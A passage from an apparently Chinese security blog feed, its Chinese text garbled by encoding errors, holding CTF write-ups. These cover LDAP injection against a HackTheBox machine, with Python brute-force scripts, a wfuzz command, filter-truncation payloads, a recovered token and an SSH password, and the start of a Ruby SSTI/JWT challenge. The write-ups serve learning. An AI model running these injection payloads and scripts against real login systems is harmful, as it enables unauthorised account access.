class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p><p>ç”¨æˆ·åä¸º<code>ldapuser</code></p><p>çŸ¥é“äº†ç”¨æˆ·åä¹‹åï¼Œæˆ‘ä»¬å°±è¦å»è·å–ç”ŸæˆOTPçš„81ä½tokenï¼Œé€šè¿‡é¡µé¢æºä»£ç çš„æç¤ºï¼Œè¿™ä¸ªtokenå­˜å‚¨åœ¨æŸä¸€ä¸ªLDAPé»˜è®¤å·²ç»å­˜åœ¨çš„å±æ€§å½“ä¸­ã€‚è€Œé»˜è®¤çš„å±æ€§å¯ä»¥åœ¨<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>ä¸­æ‰¾åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æƒ³å†™è„šæœ¬çš„è¯ç”¨wfuzzæ¥Fuzzé¶æœºçš„LDAPä¸­å­˜åœ¨çš„å±æ€§å¯èƒ½ä¼šæ›´å¿«ä¸€äº›ï¼Œä½†è¿˜æ˜¯è¦å…ˆæ‰¾åˆ°æ³¨å…¥çš„å½¢å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ldapuser)</span><br><span class="line">(FUZZ&#x3D;*)</span><br><span class="line">)</span><br><span class="line">(&amp;|</span><br><span class="line">(other comparing)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æ­¤å¤–è¿˜è¦æŠŠæ³¨å…¥çš„å­—ç¬¦<code>ldapuser)(FUZZ=*</code>è¿›è¡ŒäºŒæ¬¡URLç¼–ç ï¼Œç¼–ç ä¹‹åçš„ç»“æœ<code>ldapuser%2529%2528FUZZ%253d%252a</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p><p>æˆ‘ä»¬Fuzzå‡ºæ¥äº†è¿™ä¹ˆäº›å±æ€§æ˜¯å­˜åœ¨äºé¶æœºçš„LDAPæœåŠ¡ä¸­çš„ï¼Œç°åœ¨çš„å·¥ä½œå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„å±æ€§æ¥çŒœè§£ï¼Œå±äºä¸€äº›é‡å¤æ€§çš„å·¥ä½œï¼Œå°±ä¸åœ¨è¿™é‡Œè¿‡å¤šèµ˜è¿°äº†ï¼Œæœ€åå¯ä»¥æ‰¾åˆ°tokenæ˜¯å­˜å‚¨äºpagerå±æ€§ä¸­ã€‚æ¥ç€å†™è„šæœ¬ç”¨æ¥burp81ä½token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯éœ€è¦åˆ æ‰æœ€åçš„ä¸€ä¸ª9ï¼Œæ‰€ä»¥æœ€åçš„tokenå°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure><p>æ¥ç€ç”¨stokenå·¥å…·å¯¼å…¥token</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p><p>ç”ŸæˆOTP</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p><p>æˆåŠŸç™»å½•åï¼Œè·³è½¬åˆ°<code>page.php</code>é¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p><p>Damn itâ€¦æç¤ºæˆ‘ä»¬<code>ldapuser</code>æƒé™ä¸å¤Ÿä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p><ul><li><p>å¯¹<code>group</code>å±æ€§è¿›è¡Œæ³¨å…¥ï¼Œå³æŠŠåé¢groupå±æ€§çš„filteræˆªæ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(pager&#x3D;&lt;token&gt;)</span><br><span class="line">(uid&#x3D;ldapuser)))%00</span><br><span class="line">)</span><br><span class="line">(|</span><br><span class="line">(group&#x3D;root)</span><br><span class="line">(group&#x3D;adm)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨<code>*</code>é€šé…ç¬¦ä½œä¸ºç”¨æˆ·åç™»å½•</p></li></ul><p>è¿™é‡Œæ¼”ç¤ºä¸€ä¸‹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œpayloadç›´æ¥æ”¾åˆ°burpä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p><p>å†å»æ‰§è¡Œlså‘½ä»¤</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p><p>è¯»å–page.phpæ–‡ä»¶ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p><p>SSHç™»å½•ï¼š<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;æ–‡ç« é¦–å‘äº å®‰å…¨å®¢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»&quot;&gt;ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»&lt;/h1&gt;
&lt;p&gt;æœ€è¿‘åœ¨HackTheBoxä¸Šæ°ªäº†é‡‘ï¼ˆè‚‰ç–¼ğŸ˜­ï¼‰ï¼Œåšäº†ä¸€äº›å·²ç»retiredçš„é«˜è´¨é‡é¶æœº
      
    
    </summary>
    
    
      <category term="Webå®‰å…¨" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="åŸºç¡€å­¦ä¹ " scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Webå®‰å…¨å­¦ä¹ " scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="LDAP" scheme="http://ca0y1h.top/tags/LDAP/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”RubyåŠGo</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo/</id>
    <published>2020-08-18T12:27:10.000Z</published>
    <updated>2020-08-18T12:28:09.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SCTF2019-Flag-Shop">SCTF2019 Flag Shop</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>JWTä¼ªé€ </li><li>Ruby SSTI</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><h4 id="è§£æ³•1">è§£æ³•1</h4><p>æ‰“å¼€é¶æœºï¼ŒæŸ¥çœ‹æºä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 style=<span class="string">&quot;text-align: center&quot;</span>&gt;Flag Shop&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">Your uid is &lt;b id=<span class="string">&quot;uid&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Your JinKela is &lt;b id=<span class="string">&quot;jkl&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Flag Price: <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span>1000000000000000000000000000<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&lt;hr /&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=<span class="string">&quot;buyFlag()&quot;</span> style=<span class="string">&quot;text-align: left&quot;</span>&gt;buy flag&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;reset()&quot;</span> style=<span class="string">&quot;text-align: center&quot;</span>&gt;reset&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;work()&quot;</span> style=<span class="string">&quot;text-align: right&quot;</span>&gt;work&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buyFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/shop&quot;</span>, &#123;</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// or &#x27;PUT&#x27;</span></span><br><span class="line">            headers: <span class="keyword">new</span> Headers(&#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">            .then(<span class="function"><span class="params">res</span> =&gt;</span> res.text())</span><br><span class="line"></span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                    alert(response)</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            .catch(<span class="function"><span class="params">error</span> =&gt;</span>alert(error))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(confirm(<span class="string">&quot;This will reset all Jinkelas , Are U Sure?&quot;</span>))&#123;</span><br><span class="line">            fetch(<span class="string">&quot;/api/auth&quot;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/work?name=bot&amp;do=bot is working&quot;</span>)</span><br><span class="line">            .then(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&quot;/api/info&quot;</span>,&#123;</span><br><span class="line">            redirect: <span class="string">&#x27;manual&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(res.ok)&#123;</span><br><span class="line">              <span class="keyword">return</span> res.json()</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              fetch(<span class="string">&quot;/api/auth&quot;</span>)</span><br><span class="line">              reject;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> info = res;</span><br><span class="line">            <span class="built_in">console</span>.log(info);</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;uid&quot;</span>).innerText = info.uid;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;jkl&quot;</span>).innerText = info.jkl;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>auth ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ª jwt tokenã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194238.png" alt=""></p><p>ç°åœ¨å°±éœ€è¦æ‰¾åˆ°secretã€‚æ‰«æç«™ç‚¹ï¼Œå‘ç°æœ‰filebak</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨workè·¯ç”±</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span 